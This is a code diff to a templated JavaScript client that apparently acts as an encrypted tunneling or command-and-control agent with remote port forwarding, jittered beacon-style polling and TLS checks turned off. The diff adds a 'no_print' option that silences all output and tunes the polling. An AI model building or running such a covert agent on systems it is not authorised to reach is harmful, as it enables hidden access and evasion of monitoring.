@@ -10,7 +10,9 @@ try {
   var WebSocket = require('ws');
   wsImported = true;
 } catch {
+  {% if not no_print %}
   console.warn('[!] Failed to import "ws" module -- WebSocket support disabled.');
+  {% endif %}
 }
 {% endif %}
 /* AES */
@@ -448,7 +450,9 @@ class Client {
     process.exit(0);
     {% endif %}
     {% endif %}
+    {% if not no_print %}
     console.log('[!] Kill signal received');
+    {% endif %}
     this.killed = true;
     for (const forwarder of [...this.remotePortForwarders]) {
       forwarder.stop();
@@ -681,12 +685,16 @@ class WSClient extends Client {
             reject(err);
             return;
           }
+          {% if not no_print %}
           console.error('[!] handler error:', err.message);
+          {% endif %}
         }
       });
 
       this.ws.addEventListener('close', (e) => {
+        {% if not no_print %}
         console.log(`[*] Websocket Closed: code=${e.code}, reason=${e.reason || ''}`);
+        {% endif %}
         this._signalSendLoop();
         resolve({ code: e.code, reason: e.reason });
       }, { once: true });
@@ -751,6 +759,7 @@ class HTTPClient extends Client {
     this.serverUrl = String(serverUrl).replace(/\/+$/g, '');
     this.upstream_messages = [];
     this._pending = [];
+    this._pollWake = null;
     this._timeoutMs = 10000;
 {% if not electron %}
     const isHttps = this.serverUrl.startsWith('https');
@@ -758,6 +767,31 @@ class HTTPClient extends Client {
       ? new https.Agent({ rejectUnauthorized: false })
       : new http.Agent();
 {% endif %}
+  }
+
+  _wakePoll() {
+    if (this._pollWake) this._pollWake();
+  }
+
+  async _waitForPoll(delayMs) {
+    if (this.killed) return;
+{% if not no_adaptive_polling %}
+    if (this.upstream_messages.length > 0) return;
+{% endif %}
+    await new Promise(resolve => {
+      const wake = () => {
+        clearTimeout(timer);
+        this._pollWake = null;
+        resolve();
+      };
+      const timer = setTimeout(wake, delayMs);
+      this._pollWake = wake;
+    });
+  }
+
+  handleCheckout() {
+    super.handleCheckout();
+    this._wakePoll();
   }
 
   async _postBinary(url, bodyBytes, timeoutMs = this._timeoutMs) {
@@ -863,7 +897,7 @@ class HTTPClient extends Client {
     let _pollDelay = 0.1;
     const _POLL_MIN = 0.1;
     const _POLL_MAX = 10.0;
-    const _POLL_FACTOR = 1.5;
+    const _POLL_FACTOR = 1.1;
     const _POLL_JITTER = 0.2;
 {% endif %}
     while (!this.killed) {
@@ -873,6 +907,10 @@ class HTTPClient extends Client {
       }
 
       const toSend = [CheckInMessage(this.identifier), ...this._pending];
+{% if not no_adaptive_polling %}
+      const sentActivity = this._pending.some(m => m.kind !== 'CheckInMessage' && m.kind !== 'CheckOutMessage');
+      let receivedActivity = false;
+{% endif %}
       const payload = this.serializeMessages(toSend);
 
       let resp;
@@ -894,11 +932,7 @@ class HTTPClient extends Client {
           }
 {% if not no_adaptive_polling %}
           const _realMsgs = messages.filter(m => m.kind !== 'CheckInMessage' && m.kind !== 'CheckOutMessage').length;
-          if (_realMsgs > 0) {
-            _pollDelay = _POLL_MIN;
-          } else {
-            _pollDelay = Math.min(_pollDelay * _POLL_FACTOR, _POLL_MAX);
-          }
+          receivedActivity = _realMsgs > 0;
 {% endif %}
           for (const m of messages) {
             await this.dispatchMessage(m);
@@ -907,26 +941,29 @@ class HTTPClient extends Client {
           if (e instanceof DecryptionError) throw e;
           throw new Error(`Failed to deserialize server response: ${e.message}`);
         }
-      } else {
-{% if not no_adaptive_polling %}
-        _pollDelay = Math.min(_pollDelay * _POLL_FACTOR, _POLL_MAX);
-{% endif %}
       }
 
 {% if not no_adaptive_polling %}
+      _pollDelay = sentActivity || receivedActivity
+        ? _POLL_MIN
+        : Math.min(_pollDelay * _POLL_FACTOR, _POLL_MAX);
       const _jittered = _pollDelay * (1.0 - _POLL_JITTER + Math.random() * 2 * _POLL_JITTER);
-      await new Promise(r => setTimeout(r, _jittered * 1000));
+      await this._waitForPoll(_jittered * 1000);
 {% else %}
-      await new Promise(r => setTimeout(r, 100));
+      await this._waitForPoll(100);
 {% endif %}
     }
   }
 
   async sendUpstreamMessage(upstream_message) {
     this.upstream_messages.push(upstream_message);
+{% if not no_adaptive_polling %}
+    this._wakePoll();
+{% endif %}
   }
 
   closeTransport() {
+    this._wakePoll();
 {% if not electron %}
     if (this._agent) {
       this._agent.destroy();
@@ -1018,19 +1055,23 @@ class RemotePortForwarder {
           resolve(1);
           return;
         }
+        {% if not no_print %}
         console.log(
           `[+] Remote Port Forwarder listening on ${addr.address}:${addr.port}`
         );
+        {% endif %}
         this.messenger.remotePortForwarders.push(this);
         this.server.on('error', () => this.cleanup());
         resolve(0);
       });
 
       this.server.once('error', (e) => {
+        {% if not no_print %}
         console.error(
           `[!] ${this.listening_host}:${this.listening_port} is already in use or failed:`,
           e.message
         );
+        {% endif %}
         const reason = e.code === 'EADDRINUSE' ? 2
                      : e.code === 'EACCES' ? 3
                      : e.code === 'ENOTFOUND' ? 4
@@ -1068,6 +1109,7 @@ function sha256Bytes(s) {
 
 {% if not no_arg_parsing %}
 function printHelp() {
+  {% if not no_print %}
   console.log('Usage: client [options]');
   console.log('');
   console.log('Options:');
@@ -1078,6 +1120,7 @@ function printHelp() {
   console.log('  --retry-duration <secs>    Total time to retry connecting');
   console.log('  --retry-attempts <n>       Number of retry attempts');
   console.log('  -h, --help                 Show this help message');
+  {% endif %}
 }
 
 function parseArgs(argv) {
@@ -1104,7 +1147,9 @@ function parseArgs(argv) {
       case '--retry-attempts':
       case '--retry-duration':
         if (i + 1 >= argv.length) {
+          {% if not no_print %}
           console.log(`[!] ${a} requires a value.`);
+          {% endif %}
           break;
         }
         i++;
@@ -1116,7 +1161,9 @@ function parseArgs(argv) {
         else if (a === '--proxy') args.proxy = argv[i];
         break;
       default:
+        {% if not no_print %}
         console.log(`[!] Could not find argument \`${a}\`.`);
+        {% endif %}
         break;
     }
   }
@@ -1135,14 +1182,18 @@ async function main() {
   const serverUrl = args.serverUrl || DEFAULTS.SERVER;
   let encryptionKey = args.encryptionKey || DEFAULTS.ENCRYPTION_KEY;
   if (!encryptionKey) {
+    {% if not no_print %}
     console.error('[!] No encryption key provided, please specify `--encryption-key`');
+    {% endif %}
     return;
   }
   encryptionKey = sha256Bytes(encryptionKey);
   const userAgent = args.userAgent || DEFAULTS.USER_AGENT;
   const proxy = args.proxy || DEFAULTS.PROXY;
   if (proxy) {
+    {% if not no_print %}
     console.log('[!] No native support for proxies.');
+    {% endif %}
   }
 
   const retryDuration = Number.isFinite(args.retryDuration)
@@ -1186,26 +1237,38 @@ async function main() {
       } else if (attempt.includes('http')) {
         client = new HTTPClient(candidateUrl, encryptionKey, userAgent);
       } else {
+        {% if not no_print %}
         console.log(`[!] Unsupported scheme ${attempt.toUpperCase()}`);
+        {% endif %}
         continue;
       }
 
+      {% if not no_print %}
       console.log(`[*] Attempting to connect over ${attempt.toUpperCase()} to ${candidateUrl} (${i + 1}/${attempts.length})`);
+      {% endif %}
       await client.connect();
+      {% if not no_print %}
       console.log(`[+] Connected to ${candidateUrl}`);
+      {% endif %}
       break;
     } catch (e) {
       if (e instanceof DecryptionError) {
+        {% if not no_print %}
         console.error('[!] Decryption failed -- the encryption key is likely incorrect. The messenger cannot decrypt server traffic and is stopping.');
+        {% endif %}
         return;
       }
+      {% if not no_print %}
       console.error(`[!] Connection failed: ${e?.message || e}`);
+      {% endif %}
       client = null;
     }
   }
 
   if (!client) {
+    {% if not no_print %}
     console.log('[!] All connection attempts failed.');
+    {% endif %}
     return;
   }
 
@@ -1214,16 +1277,22 @@ async function main() {
       await client.start();
     } catch (e) {
       if (e instanceof DecryptionError) {
+        {% if not no_print %}
         console.error('[!] Decryption failed -- the encryption key is likely incorrect. The messenger cannot decrypt server traffic and is stopping.');
+        {% endif %}
         return;
       }
+      {% if not no_print %}
       console.error(`[!] Disconnected: ${e?.message || e}`);
+      {% endif %}
     }
 
     if (client.killed) return;
 
     if (!(retryAttempts > 0)) {
+      {% if not no_print %}
       console.log('[*] Retry attempts set to zero, exiting.');
+      {% endif %}
       return;
     }
 
@@ -1232,20 +1301,28 @@ async function main() {
 
     while (consecutiveFailures < retryAttempts) {
       consecutiveFailures++;
+      {% if not no_print %}
       console.log(`[*] Attempting to reconnect (${consecutiveFailures}/${retryAttempts})`);
+      {% endif %}
       await sleep(sleepTime * 1000);
       try {
         await client.connect();
         if (client.killed) break;
+        {% if not no_print %}
         console.log(`[+] Reconnected`);
+        {% endif %}
         consecutiveFailures = 0;
         await client.start();
       } catch (e) {
         if (e instanceof DecryptionError) {
+          {% if not no_print %}
           console.error('[!] Decryption failed -- the encryption key is likely incorrect. The messenger cannot decrypt server traffic and is stopping.');
+          {% endif %}
           return;
         }
+        {% if not no_print %}
         console.error(`[!] Reconnection failed: ${e?.message || e}`);
+        {% endif %}
       }
       if (client.killed) break;
     }
@@ -1267,8 +1344,16 @@ const DEFAULTS = {
 
 {% if not electron %}
 if (require.main === module) {
-  main().catch(console.error);
+  main().catch((error) => {
+  {% if not no_print %}
+    console.error(error);
+  {% endif %}
+  });
 }
 {% else %}
-main().catch(console.error);
+main().catch((error) => {
+{% if not no_print %}
+  console.error(error);
+{% endif %}
+});
 {% endif %}
